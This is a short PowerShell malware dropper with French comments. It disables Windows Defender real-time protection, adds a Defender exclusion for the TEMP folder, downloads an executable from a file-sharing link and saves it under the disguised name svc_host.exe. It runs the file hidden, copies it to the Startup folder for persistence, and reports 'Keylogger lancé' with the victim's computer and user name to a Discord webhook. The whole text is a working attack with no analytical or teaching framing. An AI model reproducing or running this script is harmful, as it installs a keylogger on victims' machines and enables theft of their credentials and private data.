$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"
$exeUrl = "https://limewire.com/d/FDphV#TmLbLMqVie"
$exePath = "$env:TEMP\svc_host.exe"

# Désactive Defender en temps réel (1 ligne magique 2025)
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true" 2>$null

# Télécharge si pas déjà fait
if (!(Test-Path $exePath)) {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
}

# Ajoute exclusion Defender pour le dossier TEMP
powershell -c "Add-MpPreference -ExclusionPath $env:TEMP" 2>$null

# Lance l'exe
Start-Process -FilePath $exePath -WindowStyle Hidden

# Persistance + log
Copy-Item $exePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\" -Force
$body = @{ content = "Keylogger lancé + Defender bypassé sur $env:COMPUTERNAME ($env:USERNAME)" } | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
